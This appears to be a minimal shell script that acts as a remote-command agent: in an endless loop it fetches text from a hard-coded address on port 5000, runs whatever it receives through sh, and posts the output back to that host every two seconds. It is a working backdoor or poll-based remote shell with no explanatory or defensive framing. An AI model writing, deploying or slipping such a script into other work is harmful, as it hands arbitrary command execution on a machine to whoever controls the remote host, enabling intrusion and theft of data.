#!/bin/sh
host=http://192.168.2.100:5000/
set -e
while true
do
   curl -X POST -d "`curl $host 2>/dev/null | sh`" $host
   sleep 2
done
